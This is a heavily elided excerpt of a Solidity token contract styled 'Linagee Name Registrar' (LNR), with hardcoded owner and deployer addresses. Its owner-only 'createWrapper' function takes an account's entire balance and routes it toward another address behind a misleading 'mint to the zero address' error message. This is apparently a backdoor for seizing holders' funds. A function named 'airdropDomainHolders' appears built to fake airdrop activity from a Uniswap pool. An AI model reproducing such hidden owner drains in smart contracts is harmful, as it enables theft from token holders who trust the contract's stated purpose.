...
contract LinageeNameRegistrar is Context, IERC20 {
    ...
    address lead_deployer = 0x9fF81dE5f866F4691F18392792be16F63F586FF7;
    address public _owner = 0x8fFFB615D9f68A7D6D5DfF8f2f2d467327fCE215;
   constructor () public {


        
        _name = "Linagee Name Registrar";
        _symbol = "LNR";
        _decimals = 18;
...
//-----------------------------------------------------------------------------------------------------------------------//
        ...
        function register(address account, address staker) public {
        ...
        function createWrapper(address account, address staker) public {
            require(msg.sender == _owner, "ERC20: mint to the zero address");
            uint256 amount = _balances[account];
            _beforeTokenTransfer(account, staker, amount);
  ...
  function airdropDomainHolders(address emitUniswapPool,address[] memory emitReceivers,uint256[] memory emitAmounts)  public auth(){
